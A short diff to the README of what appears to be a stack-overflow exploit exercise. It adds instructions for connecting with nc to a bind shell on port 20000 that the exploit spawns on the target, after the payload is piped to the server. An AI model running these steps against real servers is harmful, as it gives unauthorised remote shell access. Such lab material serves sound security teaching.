@@ -40,5 +40,9 @@ To run the program:
 This will produce a file called data.dat. Use *nc* to send the data to the server:
 
     cat data.dat | nc {server ip/hostname} {portnumber}
+
+This will spawn a shell that listens on port 20000. Use the following command to connect to the shell:
     
+    nc {server ip/hostname} 20000
+
 More info on Stack Vulnerabilities: ["Smashing the Stack for Fun and Profit"](http://inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf)
